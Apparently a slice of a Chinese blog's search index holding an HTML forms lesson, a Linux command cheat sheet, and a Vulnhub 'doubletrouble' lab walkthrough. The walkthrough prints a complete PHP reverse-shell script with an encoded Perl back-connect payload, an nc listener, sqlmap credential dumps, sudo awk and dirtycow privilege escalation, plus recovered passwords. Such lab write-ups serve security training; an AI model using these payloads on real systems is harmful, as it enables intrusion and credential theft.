+《div id=&quot;content&quot; style=&quot;background-color:#EEEEEE;height:200px;width:400px;float:left;&quot;》
+内容在这里《/div》
+ 
+《div id=&quot;footer&quot; style=&quot;background-color:#FFA500;clear:both;text-align:center;&quot;》
+版权 © runoob.com《/div》
+ 
+《/div》
+ 
+《/body》
+《/html》
+</code></pre>
+<p>HTML 表单</p>
+<p>表单是一个包含表单元素的区域。</p>
+<p>表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。</p>
+<p>表单使用表单标签 《form》 来设置:</p>
+<pre><code>《form》
+.
+input 元素
+.
+《/form》
+</code></pre>
+<p>HTML 表单 - 输入元素</p>
+<p>多数情况下被用到的表单标签是输入标签（《input》）。</p>
+<p>输入类型是由类型属性（type）定义的。大多数经常被用到的输入类型如下：</p>
+<p>文本域（Text Fields）</p>
+<pre><code>    文本域通过《input type=&quot;text&quot;》 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。
+
+《form》
+First name: 《input type=&quot;text&quot; name=&quot;firstname&quot;》《br》
+Last name: 《input type=&quot;text&quot; name=&quot;lastname&quot;》
+《/form》
+</code></pre>
+<p>密码字段</p>
+<p>密码字段通过标签《input type=”password”》 来定义:</p>
+<pre><code>《form》
+Password: 《input type=&quot;password&quot; name=&quot;pwd&quot;》
+《/form》
+</code></pre>
+<p>单选按钮（Radio Buttons）</p>
+<p>《input type=”radio”》 标签定义了表单单选框选项</p>
+<pre><code>《form》
+《input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;》Male《br》
+《input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;》Female
+《/form》
+</code></pre>
+<p>复选框（Checkboxes）</p>
+<p>《input type=”checkbox”》 定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。</p>
+<pre><code>《form》
+《input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;》I have a bike《br》
+《input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;》I have a car
+《/form》
+</code></pre>
+<p>提交按钮(Submit Button)</p>
+<p>《input type=”submit”》 定义了提交按钮.</p>
+<p>当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。</p>
+<pre><code>《form name=&quot;input&quot; action=&quot;html_form_action.php&quot; method=&quot;get&quot;》
+Username: 《input type=&quot;text&quot; name=&quot;user&quot;》
+《input type=&quot;submit&quot; value=&quot;Submit&quot;》
+《/form》
+</code></pre>
+</div>]]></content>
+      <categories>
+        <category>HTML基础</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux命令</title>
+    <url>/2021/06/10/linux%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="##文件操作"></a>##文件操作</h2><h2 id="增："><a href="#增：" class="headerlink" title="###增："></a>###增：</h2><pre><code>touch [文件名.后缀]  //新建文件
+vi: wq //编辑保存并退出
+echo &gt; [名称].txt //写入内容至一个文本文件 若目录无改名字的文本文件 则会自动创建
+mkdir -p //新建一个文件夹 -p：递归创建
+</code></pre>
+<h2 id="删"><a href="#删" class="headerlink" title="###删:"></a>###删:</h2><pre><code>rmdir //只能删除空文件夹
+rm //删除一个文件/文件夹
+-r //将目录及以下文件全都删除
+-f //无需确认 直接删除
+-i //删除是会提示 默认为提示
+rm -rf * //删除改目录下所有文件 谨慎使用
+fg %[工作号] //结束某个在后台的任务
+</code></pre>
+<h2 id="查："><a href="#查：" class="headerlink" title="###查："></a>###查：</h2><pre><code>ls //查看当前目录
+-a //查看当前目录所有文件 包括隐藏文件
+-l //查看当前目录文件权限
+-t //将文件依建立时间之先后次序列出
+cat //查看文件内容
+tac //倒序查看文件内容
+head -n //显示头几行文本内容 默认为10行
+tail -n //显示末尾几行文本内容 默认为10行
+tail -f //实时显示新增文本内容
+grep //查找相关字符串内容
+find //索引搜索
+ps -aux //查询所有进程
+whereis * //查看*在什么路径
+jobs [选项] //查看后台
+more [选项] [文件名] //显示文件第一页
+whoami //查看用户
+w=who //查看所有登录的用户
+</code></pre>
+<h2 id="改："><a href="#改：" class="headerlink" title="###改："></a>###改：</h2><pre><code>cp // 复制一个文件/文件夹
+-r //若给出的源文件是个目录文件，将复制改目录下所有的子目录与文件
+-p //复制文件，并会会把修改时间和访问权限也复制到新文件中
+-f //覆盖已存在的目标文件不会提示
+cat /etc/passwd &gt; ./passwd 修改文件内容至passwd
+mv [文件名] [目标目录] //移动文件至目标目录
+mv [文件名] [新文件名] //修改文件名
+touch -t [时间] [文件名] 修改文件创建世界/最后修改时间
+</code></pre>
+<h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="##查看系统信息"></a>##查看系统信息</h2><pre><code>uname 命令：
+uname --help //查看帮助
+uname -n //显示计算机名
+uname -s //显示系统名称
+uname -a //显示系统信息
+uname -m //显示计算机类型
+uanme -v //显示系统版本与时间
+uname -r //显示系统发行编号
+</code></pre>
+<h2 id="Linux按键命令"><a href="#Linux按键命令" class="headerlink" title="##Linux按键命令"></a>##Linux按键命令</h2><pre><code>Tab //自动补全命令
+Ctrl+l //清屏
+Ctrl+u //清空至首行
+Ctrl+c //取消本次命令执行
+Ctrl+z //将程序放入后台
+</code></pre>
+<h2 id="Linux压缩命令"><a href="#Linux压缩命令" class="headerlink" title="##Linux压缩命令"></a>##Linux压缩命令</h2><pre><code>tar [选项] 源文件或目录.tar.gz // 打包文件
+tar 打包与压缩:
+tar cvf a.tar ./ //打包本地文件名称为a.tar
+tar xvf a.tar //解压a.tar文件
+
+tar zcvf b.tar.gz ./* //打包所有文件为b.tar.gz
+tar zxvf b.tar.gz  //解压文件 b.tar.gz
+</code></pre>
+<h2 id="PIng命令"><a href="#PIng命令" class="headerlink" title="##PIng命令"></a>##PIng命令</h2><pre><code>ping [目标主机/域名] //对目标主机发送数据包，网络测试
+traceroute baidu.com //自由追踪
+</code></pre>
+<h2 id="Linux命令补充："><a href="#Linux命令补充：" class="headerlink" title="##Linux命令补充："></a>##Linux命令补充：</h2><pre><code>关机指令： 
+poweroff //立刻关机
+halt //立刻关机
+init命令：  
+--run level 0: 关机
+--run level 3: 纯文本模式
+--run level 6: 重新启动
+reboot //立即重启
+Shutdown [选项] 时间
+选项： 
+-c: 取消前一个关机命令
+-h: 关机
+-r：重启
+用户登录命令; 
+login //登录
+基本语法：login [name][-p][-h主机名称]
+用户退出命令： 
+exit //退出控制台
+logout //注销用户
+apt-get:  
+sudo apt-get update 更新软件列表
+sudo apt-get upgrade 更新软件
+sudo apt-get install banner 安装一个文字图形输出
+</code></pre>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulhub靶场实验1</title>
+    <url>/2021/06/19/vulhub-doubletrouble/</url>
+    <content><![CDATA[<h2 id="doubletrouble"><a href="#doubletrouble" class="headerlink" title="doubletrouble"></a>doubletrouble</h2><p>VULHUB靶场实验</p>
+<h2 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h2><p>fscan：端口扫描工具</p>
+<p>nmap：十分好用的端口扫描工具</p>
+<p>攻击机：<font color="red"><code>Kali Linux</code></font></p>
+<p>IP：<font color="red"><code>192.168.12.24</code></font></p>
+<p>目标机：<font color="red"><code>Debian</code></font></p>
+<p>IP：<font color="red"><code>192.168.12.158</code></font></p>
+<h2 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h2><h4 id="步骤1：获取目标IP地址"><a href="#步骤1：获取目标IP地址" class="headerlink" title="步骤1：获取目标IP地址"></a>步骤1：获取目标IP地址</h4><p>​    方法一：使用fscan 扫描一下ip段，获取目标ip为192.168.12.178</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022162158827.png" alt="image-20211022162158827"></p>
+<p>​    方法二：使用Advanced IP Scanner 扫描指定IP段内的机器</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022162138694.png" alt="image-20211022162138694"></p>
+<p>​    </p>
+<h4 id="步骤2：使用Nmap扫描目标开放端口"><a href="#步骤2：使用Nmap扫描目标开放端口" class="headerlink" title="步骤2：使用Nmap扫描目标开放端口"></a>步骤2：使用Nmap扫描目标开放端口</h4><p>​    使用nmap扫描192.168.12.158，发现开放了22、80端口</p>
+<p>​    <code>nmap -A -p- 192.168.12.158 -oN /root/桌面/doubletrouble.txt</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022163553259.png" alt="image-20211022163553259"></p>
+<h4 id="步骤3：访问目标网站"><a href="#步骤3：访问目标网站" class="headerlink" title="步骤3：访问目标网站"></a>步骤3：访问目标网站</h4><p>​    浏览器访问192.168.12.158，发现一个Login页面</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022162732808.png" alt="image-20211022162732808"></p>
+<p>​    尝试了弱口令没有效果，这个页面没有办法处理，使用dirsearch扫描目录</p>
+<blockquote>
+<p>用法：dirsearch -u [域名/IP地址] -o [导出文件路径]</p>
+</blockquote>
+<p>​    <code>dirsearch -u 192.168.12.158 -o /root/桌面/dir.txt </code></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191439315.png" alt="image-20211022191439315"></p>
+<p>​    使用cat命令筛选出200响应码的路径</p>
+<p>​    <code>cat dir.txt | grep 200</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022191555234.png" alt="image-20211022191555234"></p>
+<h4 id="步骤4：利用stegseek图片解密"><a href="#步骤4：利用stegseek图片解密" class="headerlink" title="步骤4：利用stegseek图片解密"></a>步骤4：利用stegseek图片解密</h4><p>​    在/secret/目录中有个比较奇怪的图片，将它保存到本地<img src="/2021/06/19/vulhub-doubletrouble/image-20211022191657862.png" alt="image-20211022191657862"></p>
+<p>​    使用stegseek对图片进行解密</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github：https://github.com/RickdeJager/stegseek/releases</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>​    kali自带了rockyou.txt，但是需要解压一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">sudo stegseek ./doubletrouble.jpg /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191902565.png" alt="image-20211022191902565"></p>
+<p>​    使用cat查看解密出的文件，得出账号密码</p>
+<pre><code>otisrush@localhost.como
+tis666   `
+</code></pre>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191951620.png" alt="image-20211022191951620"></p>
+<p>​    进入之前的登录窗口尝试登录一下，登录成功<img src="/2021/06/19/vulhub-doubletrouble/image-20211022192102168.png" alt="image-20211022192102168"></p>
+<p>​    之前在翻目录的时候看到install写着qdPM 9.1</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022192315499.png" alt="image-20211022192315499"></p>
+<h2 id="qdPM漏洞利用"><a href="#qdPM漏洞利用" class="headerlink" title="qdPM漏洞利用"></a>qdPM漏洞利用</h2><h4 id="步骤6：php反弹shell"><a href="#步骤6：php反弹shell" class="headerlink" title="步骤6：php反弹shell"></a>步骤6：php反弹shell</h4><p>​    发现就是用户的myAccount界面的图片那一栏是可以上传文件的，我们上传一个php反弹shell的脚本</p>
+<p>​    <strong>PHP反弹shell脚本：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function which($pr) &#123;</span><br><span class="line">$path = execute(&quot;which $pr&quot;);</span><br><span class="line">return ($path ? $path : $pr);</span><br><span class="line">&#125;</span><br><span class="line">function execute($cfe) &#123;</span><br><span class="line">$res = &#x27;&#x27;;</span><br><span class="line">if ($cfe) &#123;</span><br><span class="line">if(function_exists(&#x27;exec&#x27;)) &#123;</span><br><span class="line">@exec($cfe,$res);</span><br><span class="line">$res = join(&quot;\n&quot;,$res);</span><br><span class="line">&#125; elseif(function_exists(&#x27;shell_exec&#x27;)) &#123;</span><br><span class="line">$res = @shell_exec($cfe);</span><br><span class="line">&#125; elseif(function_exists(&#x27;system&#x27;)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@system($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; elseif(function_exists(&#x27;passthru&#x27;)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@passthru($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; elseif(@is_resource($f = @popen($cfe,&quot;r&quot;))) &#123;</span><br><span class="line">$res = &#x27;&#x27;;</span><br><span class="line">while(!@feof($f)) &#123;</span><br><span class="line">$res .= @fread($f,1024);</span><br><span class="line">&#125;</span><br><span class="line">@pclose($f);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $res;</span><br><span class="line">&#125;</span><br><span class="line">function cf($fname,$text)&#123;</span><br><span class="line">if($fp=@fopen($fname,&#x27;w&#x27;)) &#123;</span><br><span class="line">@fputs($fp,@base64_decode($text));</span><br><span class="line">@fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$yourip = &quot;your IP&quot;;</span><br><span class="line">$yourport = &#x27;your port&#x27;;</span><br><span class="line">$usedb = array(&#x27;perl&#x27;=&gt;&#x27;perl&#x27;,&#x27;c&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">$back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.</span><br><span class="line">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.</span><br><span class="line">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.</span><br><span class="line">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.</span><br><span class="line">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.</span><br><span class="line">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.</span><br><span class="line">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;</span><br><span class="line">cf(&#x27;/tmp/.bc&#x27;,$back_connect);</span><br><span class="line">$res = execute(which(&#x27;perl&#x27;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传shell脚本地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.xxx.xxx/index.php/myAccount</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022193246249.png" alt="image-20211022193246249"></p>
+<p>​    上传成功后，在kali中开启监听</p>
+<p>​    <code>nc -lnvp 4444</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193338295.png" alt="image-20211022193338295"></p>
+<p>​    打开uploads/users中有我们上传到的php脚本，点击php开始执行，shell反弹成功</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193545670.png" alt="image-20211022193545670"></p>
+<p>​    使用python改成伪交互式的shell</p>
+<p>​    <code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193920424.png" alt="image-20211022193920424"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>​    </p>
+<p>​    查看当前用户能使用sudo的权限 ，可免密执行awk命令</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022194739519.png" alt="image-20211022194739519"></p>
+<p>​    awk命令可以进行提权</p>
+<p>​    <code>sudo awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022201042933.png" alt="image-20211022201042933"></p>
+<p>​    进入root目录，ls查看一下，下载doubletrouble.ova</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022201850780.png" alt="image-20211022201850780"></p>
+<p>​    首先查看一下是否有python3环境</p>
+<p>​    <code>python3 -V</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022202714437.png" alt="image-20211022202714437"></p>
+<p>​    使用python3开启一个http服务，然后从本地下载doubeltrouble.ova导入</p>
+<p>​    <code>python3 -m http.server 8888</code></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022202648058.png" alt="image-20211022202648058"></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022202817305.png" alt="image-20211022202817305"></p>
+<p>​    导入后扫描一下ip</p>
+<blockquote>
+<p>目标IP地址：192.168.12.58</p>
+</blockquote>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022205106315.png" alt="image-20211022205106315"></p>
+<p>​    使用nmap扫描一下开放端口</p>
+<p>​    <code>nmap -A -p- 192.168.12.58</code></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022210136685.png" alt="image-20211022210136685"></p>
+<p>​    开放端口22、80</p>
+<p>​    访问80端口，发现是一个登录界面</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022210925530.png" alt="image-20211022210925530"></p>
+<p>​    尝试使用万能密码，测试是否存在注入</p>
+<p>​    使用burp抓包，导出为txt文件，使用sqlmap测试</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022211235472.png" alt="image-20211022211235472"></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022211347686.png" alt="image-20211022211347686"></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022211538042.png" alt="image-20211022211538042"></p>
+<pre><code> sqlmap跑出 uname存在时间延时盲注
+</code></pre>
+<p>​    使用sqlmap跑用户名</p>
+<p>​    <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C username --dump --batch --threads 10</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022212640708.png" alt="image-20211022212640708"></p>
+<p>​    sqlmap跑密码</p>
+<p>​    <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C password --dump --batch --threads 10</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022213344601.png" alt="image-20211022213344601"></p>
+<p>​    尝试在网站上登录，两个都不好使，尝试使用ssh登录</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022214311920.png" alt="image-20211022214311920"></p>
+<p>​    登陆成功，查看系统版本内核</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -r</span><br><span class="line">uname -a</span><br><span class="line">得到版本是3.2.0-4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022214436791.png" alt="image-20211022214436791"></p>
+<p>​    使用<code>cat /etc/*-release</code>看到是Debian 7系统</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022214642153.png" alt="image-20211022214642153"></p>
+<p>​    Debian 7系统可以通过脏牛提权</p>
+<blockquote>
+<p>github:<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022214856123.png" alt="image-20211022214856123"></p>
+</blockquote>
+<p>​    在靶机上<code>gcc -v</code> 查看是否有gcc编译环境</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215047970.png" alt="image-20211022215047970"></p>
+<p>​    传到目标靶机上，然后进行编译</p>
+<p><code>scp /root/桌面/内网工具/脏牛/dirtycow/dirty.c clapton@192.168.12.58:/tmp </code><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215157188.png" alt="image-20211022215157188"></p>
+<p>​    <code>gcc -pthread dirty.c -o dirty -lcrypt</code> </p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215311781.png" alt="image-20211022215311781"></p>
+<p>​    然后去执行dirty</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022215345404.png" alt="image-20211022215345404"></p>
+<p>​    <code>su firefart</code></p>
+<p>​    登录到firefart上</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215539698.png" alt="image-20211022215539698">    </p>
+<p>​    成功获取到root权限以及flag</p>
+<blockquote>
+<p>flag:1B8EEA89EA92CECB931E3CC25AA8DE21</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+</search>
